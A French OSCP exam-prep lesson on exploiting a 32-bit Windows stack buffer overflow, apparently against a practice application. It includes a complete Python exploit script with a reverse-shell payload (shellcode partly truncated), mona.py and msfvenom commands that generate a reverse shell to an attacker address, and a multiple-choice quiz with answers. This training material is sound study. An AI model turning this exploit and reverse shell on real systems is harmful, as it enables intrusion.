# TOME P7 — Certifications d'Élite & Spécialisations — Jour 303 (6h) : OSCP+ Prep — Buffer Overflow 32-bit Windows (x86 EIP Overwrite, Badchars Detection, Shellcode Generation & DEP Bypass Intro)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'exploitation d'un **Buffer Overflow Stack-Based 32-bit (x86 Windows)** de niveau OSCP+ : fuzzer l'application, trouver l'offset EIP exact avec `pattern_create`, identifier les **Badchars**, trouver un gadget **JMP ESP** via `mona.py`, générer un shellcode `msfvenom`, et exploiter l'application pour un Reverse Shell.
>
> **Compétences visées :** `OSCP-05` (A) — Stack-Based Buffer Overflow x86 Windows | `OSCP-06` (A) — mona.py JMP ESP & msfvenom Shellcode

---

## 1) Module — Méthodologie Buffer Overflow 32-bit OSCP (2h)

### 📖 Narration/Intuition

La méthodologie OSCP Buffer Overflow se déroule en **7 étapes précises** que tout candidat doit maîtriser à la perfection :

```
1. FUZZING          → Trouver la taille approximative qui fait crasher l'application
2. OFFSET           → Déterminer l'offset exact jusqu'à EIP (mona pattern_create)
3. OVERWRITE EIP    → Confirmer le contrôle de EIP (0x42424242 = "BBBB")
4. BADCHARS         → Identifier les octets non autorisés (null byte, 0x0d, etc.)
5. JMP ESP          → Trouver un gadget JMP ESP dans un module sans protections
6. SHELLCODE        → Générer le payload avec msfvenom (-b badchars)
7. EXPLOIT          → Structurer : padding + EIP(JMP ESP) + NOP sled + shellcode
```

---

## 2) Module — Script d'Exploitation Complet BOF 32-bit (`exploit_bof32.py`) (2h)

### 🛠️ Atelier Pratique

```python
import socket

# Configuration
TARGET_IP   = "192.168.1.100"
TARGET_PORT = 9999

# Offset trouvé avec : msf-pattern_create -l 3000 + mona.py findmsp
OFFSET = 2003

# Adresse du gadget JMP ESP (trouvé avec mona : !mona jmp -r esp -cpb "\x00")
# Sans ASLR/SafeSEH, depuis un module de l'application (ex: essfunc.dll)
JMP_ESP = b"\xaf\x11\x50\x62"  # 0x6250_11af en little-endian

# Badchars identifiés : \x00 (null byte)
# Shellcode généré : msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 -b "\x00" -f python
shellcode = (
    b"\xba\xc1\x65\x7e\x1f\xdb\xcc\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
    b"\x52\x31\x52\x12\x03\x52\x12\x83\xc0\x65\xf1\x42\x8c\x71\x77"
    # [... shellcode tronqué pour lisibilité ...]
    b"\x5e\x35\x2a\x1a\xff\xf1\x9b\x23\x75\xad"
)

# NOP Sled (16 octets) pour absorber la légère imprécision du ESP
NOP_SLED = b"\x90" * 16

# Construction du payload final
payload  = b"A" * OFFSET       # Padding jusqu'à EIP
payload += JMP_ESP              # Écrase EIP avec l'adresse du gadget JMP ESP
payload += NOP_SLED             # NOP sled -> atterrissage sûr sur le shellcode
payload += shellcode            # Reverse shell

print(f"[*] Envoi du payload BOF de {len(payload)} octets vers {TARGET_IP}:{TARGET_PORT}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((TARGET_IP, TARGET_PORT))
    s.sendall(b"OVERFLOW1 " + payload + b"\r\n")

print("[+] Payload envoyé ! Vérifiez votre listener nc -lvnp 4444")
```

---

## 3) Module — Commandes de Référence mona.py & msfvenom (2h)

```bash
# ═══════════════════════════════════════════════════════
# MONA.PY (Immunity Debugger) — Commandes essentielles OSCP
# ═══════════════════════════════════════════════════════

# Définir le dossier de travail mona
!mona config -set workingfolder c:\mona\%p

# Créer un pattern cyclique de 3000 octets (Metasploit-style)
!mona pc 3000

# Trouver l'offset exact après crash (EIP = valeur du pattern)
!mona findmsp -distance 3000

# Identifier les badchars (comparaison avec un bytearray de référence)
!mona compare -f C:\mona\appname\bytearray.bin -a <adresse_ESP>

# Trouver un gadget JMP ESP dans les modules sans protections
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# ═══════════════════════════════════════════════════════
# MSFVENOM — Génération du shellcode 32-bit
# ═══════════════════════════════════════════════════════
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.10.100 LPORT=4444 \
    -b "\x00\x0a\x0d" \
    -e x86/shikata_ga_nai \
    -f python \
    -v shellcode
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **EIP** | Extended Instruction Pointer — Registre 32-bit pointant vers la prochaine instruction à exécuter |
| **JMP ESP** | Gadget assembleur redirigeant l'exécution vers le sommet de la pile (shellcode) |
| **NOP Sled** | Suite d'instructions `\x90` (No Operation) absorbant l'imprécision de saut vers le shellcode |
| **Badchars** | Octets interdits par l'application qui tronquent le payload (ex: `\x00` null byte) |
| **mona.py** | Plugin Immunity Debugger indispensable pour l'exploitation de BOF Windows |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans un Buffer Overflow 32-bit, quel registre CPU faut-il contrôler pour rediriger l'exécution vers notre shellcode ?
- A) EIP (Extended Instruction Pointer) — en l'écrasant avec l'adresse d'un gadget JMP ESP
- B) EAX
- C) EBX
- D) ECX

**Réponse : A**

**Q2 :** Quelle commande `mona.py` (Immunity Debugger) permet de trouver l'offset exact jusqu'à l'EIP après qu'un pattern cyclique ait provoqué un crash ?
- A) `!mona findmsp -distance 3000`
- B) `!mona jmp -r esp`
- C) `!mona pc 3000`
- D) `!mona compare`

**Réponse : A**

**Q3 :** Pourquoi insère-t-on un **NOP Sled** (`\x90 * N`) avant le shellcode dans un exploit Buffer Overflow ?
- A) Pour créer une zone d'atterrissage tolérante garantissant que l'ESP atterrit sur des instructions NOP inoffensives avant d'atteindre le shellcode
- B) Pour chiffrer le shellcode
- C) Pour augmenter la taille du payload
- D) Pour contourner le pare-feu

**Réponse : A**

**Q4 :** Que sont les **Badchars** dans le contexte d'un exploit Buffer Overflow ?
- A) Les octets qui, présents dans le payload, sont filtrés ou transformés par l'application et corrompent le shellcode (ex: `\x00` null byte, `\x0a` newline)
- B) Les caractères accentués
- C) Les espaces blancs
- D) Les chiffres hexadécimaux

**Réponse : A**

**Q5 :** Quelle option `msfvenom` permet d'exclure des octets spécifiques (badchars) lors de la génération du shellcode ?
- A) `-b "\x00\x0a\x0d"` (bad characters)
- B) `--arch x86`
- C) `-f python`
- D) `--platform win`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
